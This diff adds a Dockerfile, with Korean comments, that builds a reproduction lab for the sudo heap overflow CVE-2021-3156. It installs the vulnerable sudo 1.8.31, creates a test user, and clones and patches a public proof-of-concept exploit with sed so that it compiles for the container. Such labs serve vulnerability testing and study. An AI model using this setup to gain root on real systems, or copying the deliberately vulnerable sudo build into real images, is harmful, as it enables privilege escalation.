@@ -1,0 +1,41 @@
+# CVE-2021-3156
+
+# 베이스 이미지 설정
+FROM ubuntu:20.04
+ARG DEBIAN_FRONTEND=nointeractive
+
+# 필요한 패키지 설치
+RUN apt-get update -y
+RUN apt-get install -y build-essential \
+                       make wget whois \
+                       gdb git python3-pip \
+                       libssl-dev libffi-dev \
+                       python3-dev sudo
+
+# 취약한 sudo 빌드 및 설치
+WORKDIR /root
+RUN wget https://www.sudo.ws/dist/sudo-1.8.31.tar.gz
+RUN tar -xf sudo-1.8.31.tar.gz && \
+    cd sudo-1.8.31/ && \
+    mkdir build && cd build && \
+    ../configure --enable-env-debug && \
+    make -j && make install
+
+# 테스트 유저 생성 및 설정
+RUN useradd -ms /bin/bash Gayang2902
+WORKDIR /home/Gayang2902
+COPY ./vuln_check /home/Gayang2902/vuln_check
+
+# 공개된 PoC clone 및 컨테이너 환경에 맞게 일부 수정하여 빌드
+## 1. argv 변수 수정
+## 2. sudoedit 경로 수정
+RUN git clone https://github.com/CyberCommands/CVE-2021-3156.git && \
+    cd CVE-2021-3156 && \
+    sed -i 's|char\* argv\[\] = {[^}]*}|char* argv[] = { "sudoedit", "-s", "AAAAA", NULL };|' exploit.c && \
+    sed -i 's|/usr/bin/sudoedit|/usr/local/bin/sudoedit|g' exploit.c && \
+    make && \
+    ln -s /home/Gayang2902/CVE-2021-3156/exploit /home/Gayang2902/exploit
+
+USER Gayang2902
+
+CMD [ "bash" ]
